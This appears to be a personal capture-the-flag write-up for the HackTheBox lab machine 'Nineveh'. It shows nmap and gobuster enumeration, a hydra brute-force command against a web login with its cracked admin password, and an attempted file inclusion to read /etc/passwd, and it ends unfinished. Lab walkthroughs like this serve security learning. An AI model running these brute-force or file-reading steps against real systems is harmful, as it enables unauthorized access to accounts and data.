# nineveh

| Variable          | Value        |
| ----------------- | ------------ |
| Remote IP         | 10.10.10.43  |
| Local IP          | 10.10.14.32   |
| Local listen port | 4444 |

## Nmap
TCP port scan

```bash
$ sudo nmap -sC -sV -oA namp/nineveh 10.10.10.43
# Nmap 7.92 scan initiated Fri Jun 24 22:54:58 2022 as: nmap -sC -sV -oA ./nineveh/nmap/TCP_nineveh 10.10.10.43
# Nmap done at Fri Jun 24 22:55:01 2022 -- 1 IP address (0 hosts up) scanned in 3.43 seconds

```

UDP port scan

```bash
$ sudo nmap -Pn -sU --min-rate=10000 10.10.10.43

# Nmap 7.92 scan initiated Fri Jun 24 22:55:01 2022 as: nmap -Pn -sU --min-rate=10000 -o ./nineveh/nmap/UDP_nineveh 10.10.10.43
Nmap scan report for 10.10.10.43
Host is up.
All 1000 scanned ports on 10.10.10.43 are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)

# Nmap done at Fri Jun 24 22:55:03 2022 -- 1 IP address (1 host up) scanned in 2.19 seconds
```

no info come up with default nmap scan
so now scan with full port namp

## Full port nmap
```shell
┌──(gua🥺kali-nyan)-[~/Documents/GitHub/Pen-Test-Reports/nineveh]
└─$ nmap -p- -T4 -A -sV 10.10.10.43
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-25 00:16 JST
Nmap scan report for nineveh.htb (10.10.10.43)
Host is up (0.081s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_http-title: Site doesn't have a title (text/html).
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.07 seconds
```

apatche 2.4.18 are runnning on ubuntu
and shows this bellow

![[Pasted image 20220624230441.png]]
no interesting info

now add `nineveh.htb` at `etc/hosts` and look up

![[Pasted image 20220624231708.png]]
nothing changed

now we are going to run `gobuster`
```shell
┌──(gua🥺kali-nyan)-[~/Documents/GitHub/Pen-Test-Reports/nineveh]
└─$ gobuster dir -u http://nineveh.htb -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://nineveh.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/25 00:04:46 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 295]
/.hta                 (Status: 403) [Size: 290]
/.htaccess            (Status: 403) [Size: 295]
/index.html           (Status: 200) [Size: 178]
/info.php             (Status: 200) [Size: 83687]
/server-status        (Status: 403) [Size: 299]

===============================================================
2022/06/25 00:05:28 Finished
===============================================================
```

```shell
┌──(gua🥺kali-nyan)-[~/Documents/GitHub/Pen-Test-Reports/nineveh]
└─$ gobuster dir -u http://10.10.10.43 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.43
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/25 00:04:05 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 290]
/.htpasswd            (Status: 403) [Size: 295]
/.htaccess            (Status: 403) [Size: 295]
/index.html           (Status: 200) [Size: 178]
/info.php             (Status: 200) [Size: 83689]
/server-status        (Status: 403) [Size: 299]

===============================================================
2022/06/25 00:04:47 Finished
===============================================================
```

`/info.php`

![[Pasted image 20220625002029.png]]

regobusterd with bigger wordlist

```shell

```

found department directory
and there is a login form

![[Pasted image 20220625003316.png]]

![[Pasted image 20220625004018.png]]

found interesting info from comment of source code ` @admin! MySQL is been installed.. please fix the login page! ~amrois `

looks we got 2 usernames of this server `admin`, `amrois`.
and now try to login with `amrois`.

login with `amrois` with unreliable password and it shows error `invaild username`.
![[Pasted image 20220625003954.png]]
frome this error message, amrois are not exist
try login with `admin`

# HTTP login Brute-force Attack hydra
HTTP login brute-force attack with `hydra`
https://qiita.com/Hashibirokou/items/411a11779987043a5095

![[Pasted image 20220625005230.png]]
![[Pasted image 20220625005251.png]]
![[Pasted image 20220625005319.png]]
![[Pasted image 20220625005329.png]]

SAMPLE : `hydra -V -f -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form '/user/login.php:username=^USER^&password=^PASS^:Invalid Password!'`

-f : stop when success to login
-l : set username
-P : set password list
after these opptions, IP address and `http-post-form`.
and in the end set `login page pass:POST request data format:error massage`.
in POST request data format use `^USER^` place of user and `^PASS^` for password place.

```shell
┌──(gua🥺kali-nyan)-[~/Documents/GitHub/Pen-Test-Reports/nineveh]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid"
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-25 01:08:43
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.10.43:80/department/login.php:username=admin&password=^PASS^:Invalid
[STATUS] 1582.00 tries/min, 1582 tries in 00:01h, 14342817 to do in 151:07h, 16 active
[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-25 01:11:36
```

ran hydra and got credentials for admin
`admin:1a2w3e4r5t`

![[Pasted image 20220625012019.png]]

exploring to the `Notes` tab shows this file inclusion in the URL ahahahahhahaha

![[Pasted image 20220625012841.png]]

now try to look up `etc/passwd` file

![[Pasted image 20220625013003.png]]

but it doesnt work...
and there is no more interest things....
this page are may be honny pot